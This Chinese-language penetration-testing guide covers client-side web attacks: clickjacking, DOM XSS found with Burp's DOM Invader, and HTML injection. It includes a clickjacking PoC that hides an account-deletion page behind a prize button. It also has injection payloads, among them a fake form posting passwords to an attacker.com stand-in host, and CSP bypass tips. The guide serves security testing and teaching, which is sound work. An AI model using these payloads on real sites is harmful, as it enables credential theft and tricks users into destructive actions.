# 客户端攻击：点击劫持、DOM XSS、DOM Invader、HTML 注入

## 一句话定义
客户端漏洞在**浏览器里发作**，服务端看不见：点击劫持透明框骗点、DOM XSS 数据只在客户端流进危险接收器、HTML 注入改渲染——靠 **Burp 内置浏览器 + DOM Invader** 追踪"污染源→接收器"链路。

## 核心架构 / 工作原理

```mermaid
graph TD
  A[客户端攻击四类] --> B[点击劫持 Clickjacking]
  B --> B1[缺 X-Frame-Options / CSP frame-ancestors]
  B --> B2[透明 iframe 覆盖目标按钮]
  B --> B3[受害者以为点 A 实则点 B(删账号/授权/点赞)]
  
  A --> C[DOM XSS]
  C --> C1[Source 污染源: location.hash/search/href/referrer/document.cookie/localStorage/postMessage]
  C --> C2[Sink 危险接收器: innerHTML/outerHTML/document.write/eval/Function/setTimeout/location.href/jQuery.html()]
  C --> C3[数据流: Source -> 传播/转换 -> Sink 执行]
  C --> C4[服务端完全不见请求/响应]
  
  A --> D[DOM Invader 自动化发现]
  D --> D1[Burp 内置浏览器集成扩展]
  D --> D2[自动标记 Source/Sink/传播路径]
  D --> D3[可视化污染链: Source -> Propagator -> Sink]
  D --> D4[可造 Payload 验证可利用性]
  
  A --> E[HTML 注入]
  E --> E1[注入标签改渲染: <h1> <iframe> <form> <img> <svg>]
  E --> E2[钓鱼/破坏布局/窃取表单/诱导下载]
  E --> E3[比 XSS 门槛低但危害也大]
```

| 攻击类型 | 核心检测点 | Burp 工具 | 验证方式 |
|----------|------------|-----------|----------|
| **点击劫持** | 响应头无 `X-Frame-Options` / `CSP: frame-ancestors 'none'` | Proxy/Repeater 看响应头 | 构造 iframe PoC 页面 → 受害者访问 → 看是否被框住可点击 |
| **DOM XSS** | Source→Sink 链路存在且无净化 | **DOM Invader** (内置浏览器) | Invader 标出链路 → 造 Payload → 触发 Sink 执行 |
| **HTML 注入** | 反射/存储点回显未过滤标签 | Repeater/内置浏览器 | 注入 `<h1>Hacked</h1>` `<iframe src=...>` → 看页面渲染 |

## 快速上手步骤

1. **测点击劫持**：
   - 访问目标页面 → Proxy 看响应头 → 找 `X-Frame-Options` `Content-Security-Policy: frame-ancestors`
   - 缺失/宽松(`ALLOWALL` `*` `self` 含外域) → 可被框
   - 构造 PoC：`<iframe src="https://target.com/sensitive-action" style="opacity:0.5;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>` → 诱导受害者访问
2. **用 DOM Invader 测 DOM XSS**：
   - 打开 Burp 内置浏览器(Proxy → Open browser) → 访问目标
   - 右侧 DOM Invader 面板 → 勾选 "Enable" → 刷新页面操作
   - 看 **Sources** 列表(红=可控、绿=只读) → 点 Source 看 **Sinks** 与 **Propagation** 路径
   - 选可疑链路 → "Generate payload" → 浏览器自动注入 → 观察是否执行(弹窗/网络请求/DOM 变化)
   - 导出链路图/报告
3. **测 HTML 注入**：
   - 找反射点(搜索、报错、重定向)与存储点(评论、资料、工单)
   - 注入标签：`<h1>Test</h1>` `<iframe src="http://attacker.com">` `<form action="http://attacker.com/steal"><input name="password"></form>` `<svg/onload=alert(1)>`
   - 看响应/页面是否原样渲染标签
4. **绕过 CSP/过滤器**：
   - CSP 宽松：`script-src 'unsafe-inline'` `'self'` 允许内联/同域
   - 利用现有脚本/JSONP/AngularJS 模板注入/事件处理器 `onerror` `onload` `onfocus`

```html
<!-- 点击劫持 PoC 模板 -->
<!DOCTYPE html>
<html>
<head><style>iframe{opacity:0.1;position:absolute;top:0;left:0;width:100%;height:100%;z-index:9999;}</style></head>
<body>
  <div>点击下方按钮领奖</div>
  <button style="position:relative;z-index:10000;">领取奖励</button>
  <iframe src="https://target.com/account/delete"></iframe>
</body>
</html>
```

## 踩坑避坑指南

| 场景 | 问题现象 | 原因 | 解决/最佳实践 |
|------|----------|------|---------------|
| 服务端过滤了以为安全 | DOM XSS 数据只在客户端流动 | 服务器从未见过恶意数据 | **必须用内置浏览器+DOM Invader**，别只靠 Proxy/Repeater |
| 没弹窗以为没 XSS | 只有 source→sink 链路没造出执行 Payload | Sink 需特定语法/上下文 | **看 Invader 的链路图**比等弹窗更准；尝试多种 Sink 语法 |
| CSP 以为万能 | 配置不当/允许 unsafe-inline/信任 CDN 被劫持 | CSP 策略漏洞 | 审计 CSP：`script-src` `object-src` `base-uri` `frame-ancestors` 严格收紧 |
| 只测反射点 | 忽略存储型 DOM XSS(评论里存 Source 触发) | 测试面窄 | 所有**用户可控数据最终进前端 JS**的路径全测：URL、存储、WebSocket、postMessage |
| 点击劫持只测主页 | 忽略敏感操作页(删号/授权/支付) | 目标不对 | **重点测高危操作页面**：账号删除、OAuth 授权、支付确认、权限变更 |

## 替代方案对比

| 维度 | Burp DOM Invader | 手工浏览器 DevTools | 专用扫描器 | 代码审计 |
|------|------------------|---------------------|------------|----------|
| DOM XSS 发现率 | ✅ 高(自动追踪) | ⚠️ 靠人眼/经验 | ⚠️ 模板依赖 | ✅ 源码级全覆盖 |
| 可视化链路 | ✅ 图形化 source→sink | ❌ 无 | ❌ 无 | ⚠️ 需工具辅助 |
| 点击劫持 | ✅ 响应头检查 | ✅ 同 | ✅ 被动规则 | ✅ 响应头审计 |
| 学习成本 | 低(集成在 Burp) | 中 | 低 | 高 |
